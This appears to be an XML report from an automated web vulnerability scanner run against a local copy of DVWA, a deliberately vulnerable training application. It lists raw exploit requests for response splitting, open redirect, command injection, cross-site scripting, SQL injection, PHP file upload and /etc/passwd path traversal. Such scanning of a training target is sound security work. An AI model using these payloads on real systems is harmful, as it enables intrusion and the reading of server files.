<?xml version="1.0" encoding="utf-8"?><report>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/MySQL.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix:

]]></exploit><type>HTTP Response Splitting</type><params><param><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src></param><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/MySQL.php/ HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix: http://www.ptsecurity.com/

]]></exploit><type>Open Redirect</type><params><param vulnerable="true"><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src><payload>http://www.ptsecurity.com/</payload><dependencies><dependency>%2F</dependency><dependency>%3A</dependency></dependencies></param><param><name>PHP_SELF</name><src>REQUEST_URI</src></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/PGSQL.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix:

]]></exploit><type>HTTP Response Splitting</type><params><param><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src></param><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/exec/source/low.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 72
Content-Type: application/x-www-form-urlencoded

Submit=935137890000&ip=%26ping+-n+10+127.0.0.1%26ping+-n+10+127.0.0.1%26]]></exploit><type>OS Commanding</type><params><param vulnerable="true"><name>ip</name><src>REQUEST_ARGS</src><payload>&amp;ping -n 10 127.0.0.1&amp;ping -n 10 127.0.0.1&amp;</payload><dependencies><dependency>%26</dependency></dependencies></param><param><name>Submit</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/PGSQL.php/ HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix: http://www.ptsecurity.com/

]]></exploit><type>Open Redirect</type><params><param vulnerable="true"><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src><payload>http://www.ptsecurity.com/</payload><dependencies><dependency>%2F</dependency><dependency>%3A</dependency></dependencies></param><param><name>PHP_SELF</name><src>REQUEST_URI</src></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/MySQL.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/dvwa/includes/DBMS/PGSQL.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/exec/source/medium.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 72
Content-Type: application/x-www-form-urlencoded

Submit=935137890000&ip=%26ping+-n+10+127.0.0.1%26ping+-n+10+127.0.0.1%26]]></exploit><type>OS Commanding</type><params><param><name>Submit</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param><param vulnerable="true"><name>ip</name><src>REQUEST_ARGS</src><payload>&amp;ping -n 10 127.0.0.1&amp;ping -n 10 127.0.0.1&amp;</payload><dependencies><dependency>%26</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/open_redirect/source/low.php?redirect=%0D%0ACustom-Header%3A+Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>redirect</name><src>REQUEST_GET_ARGS</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/open_redirect/source/low.php?redirect=http%3A%2F%2Fwww.ptsecurity.com%2F HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Open Redirect</type><params><param vulnerable="true"><name>redirect</name><src>REQUEST_GET_ARGS</src><payload>http://www.ptsecurity.com/</payload><dependencies><dependency>%2F</dependency><dependency>%3A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/open_redirect/source/high.php?redirect=%0D%0ACustom-Header%3A+Test%0D%0Ainfo.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>redirect</name><src>REQUEST_GET_ARGS</src><payload>
Custom-Header: Test
info.php</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/open_redirect/source/high.php?redirect=http%3A%2F%2Fwww.ptsecurity.com%2Finfo.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Open Redirect</type><params><param vulnerable="true"><name>redirect</name><src>REQUEST_GET_ARGS</src><payload>http://www.ptsecurity.com/info.php</payload><dependencies><dependency>%2F</dependency><dependency>%3A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/open_redirect/source/medium.php?redirect=%0D%0ACustom-Header%3A+Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>redirect</name><src>REQUEST_GET_ARGS</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/csp/source/jsonp.php?callback=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param vulnerable="true"><name>callback</name><src>REQUEST_GET_ARGS</src><payload>&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/brute/source/low.php?Login=935137890000&username=%27or+sleep%285%29+and+%271 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>SQL Injection</type><params><param vulnerable="true"><name>username</name><src>REQUEST_GET_ARGS</src><payload>'or sleep(5) and '1</payload><dependencies><dependency>%28</dependency><dependency>%29</dependency><dependency>%27</dependency></dependencies></param><param><name>Login</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/upload/source/low.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 292
Content-Type: multipart/form-data; boundary=c4ca4238a0b923820dcc509a6f75849b

--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="Upload"

935137890000
--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="uploaded"; filename=".php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
--c4ca4238a0b923820dcc509a6f75849b--]]></exploit><type>Arbitrary File Creation</type><params><param><name>Upload</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param><param vulnerable="true"><name>filename</name><src>REQUEST_FILES</src><payload>.php</payload><dependencies /></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/upload/source/medium.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 278
Content-Type: multipart/form-data; boundary=c4ca4238a0b923820dcc509a6f75849b

--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="Upload"

935137890000
--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="uploaded"; filename=".php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
--c4ca4238a0b923820dcc509a6f75849b--]]></exploit><type>Arbitrary File Creation</type><params><param><name>Upload</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param><param><name>Content-Type</name><src>REQUEST_HEADERS</src><value>image%2fjpeg</value></param><param><name>size</name><src>REQUEST_FILES</src><value>0</value></param><param vulnerable="true"><name>filename</name><src>REQUEST_FILES</src><payload>.php</payload><dependencies /></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/upload/source/medium.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 277
Content-Type: multipart/form-data; boundary=c4ca4238a0b923820dcc509a6f75849b

--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="Upload"

935137890000
--c4ca4238a0b923820dcc509a6f75849b
Content-Disposition: form-data; name="uploaded"; filename=".php"
Content-Type: image/png

<?php phpinfo(); ?>
--c4ca4238a0b923820dcc509a6f75849b--]]></exploit><type>Arbitrary File Creation</type><params><param><name>Upload</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param><param><name>Content-Type</name><src>REQUEST_HEADERS</src><value>image%2fpng</value></param><param><name>size</name><src>REQUEST_FILES</src><value>0</value></param><param vulnerable="true"><name>filename</name><src>REQUEST_FILES</src><payload>.php</payload><dependencies /></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/sqli_blind/source/low.php?Submit=935137890000 HTTP/
Custom-Header: Test

Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>SERVER_PROTOCOL</name><src>REQUEST_HEADERS</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param><param><name>Submit</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/sqli_blind/source/impossible.php?Submit=935137890000 HTTP/
Custom-Header: Test

Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>HTTP Response Splitting</type><params><param><name>Submit</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param><param vulnerable="true"><name>SERVER_PROTOCOL</name><src>REQUEST_HEADERS</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/sqli_blind/source/high.php HTTP/
Custom-Header: Test

Host: localhost
Accept-Encoding: identity
Connection: close
Cookie: id=935137890000

]]></exploit><type>HTTP Response Splitting</type><params><param><name>id</name><src>REQUEST_COOKIES</src><value>935137890000</value></param><param vulnerable="true"><name>SERVER_PROTOCOL</name><src>REQUEST_HEADERS</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/vulnerabilities/sqli/session-input.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 54
Content-Type: application/x-www-form-urlencoded

id=%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E]]></exploit><type>Cross-site Scripting</type><params><param vulnerable="true"><name>id</name><src>REQUEST_POST_ARGS</src><payload>&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security= HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param><param><name>security</name><src>REQUEST_GET_ARGS</src></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=&security=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_help.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&locale=en&security=935137890000 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param><name>locale</name><src>REQUEST_GET_ARGS</src><value>en</value></param><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param><param><name>security</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_help.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&locale=&security=935137890000 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param><name>locale</name><src>REQUEST_GET_ARGS</src></param><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param><param><name>security</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_help.php?id=&locale=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security=935137890000 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>locale</name><src>REQUEST_GET_ARGS</src><payload>/../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param><param><name>id</name><src>REQUEST_GET_ARGS</src></param><param><name>security</name><src>REQUEST_GET_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security= HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param><param><name>security</name><src>REQUEST_GET_ARGS</src></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=&security=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Arbitrary File Reading</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>../../../../../../../../etc/passwd</payload><dependencies><dependency>%2F</dependency><dependency>%00</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/security.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix: 
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

seclev_submit=935137890000]]></exploit><type>HTTP Response Splitting</type><params><param><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src></param><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param><param><name>seclev_submit</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=%22%3E%3C%2Fform%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&security= HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param vulnerable="true"><name>id</name><src>REQUEST_GET_ARGS</src><payload>"&gt;&lt;/form&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%22</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param><param><name>security</name><src>REQUEST_GET_ARGS</src></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/security.php/ HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
X-Forwarded-Prefix: http://www.ptsecurity.com/
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

seclev_submit=935137890000]]></exploit><type>Open Redirect</type><params><param vulnerable="true"><name>X-Forwarded-Prefix</name><src>REQUEST_HEADERS</src><payload>http://www.ptsecurity.com/</payload><dependencies><dependency>%2F</dependency><dependency>%3A</dependency></dependencies></param><param><name>PHP_SELF</name><src>REQUEST_URI</src></param><param><name>seclev_submit</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[POST /DVWA-master/security.php/%0D%0ACustom-Header:%20Test%0D%0A HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

seclev_submit=935137890000]]></exploit><type>HTTP Response Splitting</type><params><param vulnerable="true"><name>PHP_SELF</name><src>REQUEST_URI</src><payload>
Custom-Header: Test
</payload><dependencies><dependency>%3A</dependency><dependency>%0D</dependency><dependency>%0A</dependency></dependencies></param><param><name>seclev_submit</name><src>REQUEST_POST_ARGS</src><value>935137890000</value></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=sqli&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>sqli</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=sqli_blind&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>sqli_blind</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=upload&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>upload</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=xss_r&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>xss_r</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=xss_s&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>xss_s</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=weak_id&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>weak_id</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=javascript&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>javascript</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=authbypass&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>authbypass</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=open_redirect&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src><value>open_redirect</value></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
<vuln><exploit><![CDATA[GET /DVWA-master/vulnerabilities/view_source.php?id=&security=%3C%2Fh2%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close

]]></exploit><type>Cross-site Scripting</type><params><param><name>id</name><src>REQUEST_GET_ARGS</src></param><param vulnerable="true"><name>security</name><src>REQUEST_GET_ARGS</src><payload>&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;</payload><dependencies><dependency>%3C</dependency><dependency>%3E</dependency><dependency>%2F</dependency><dependency>%28</dependency><dependency>%29</dependency></dependencies></param></params></vuln>
</report>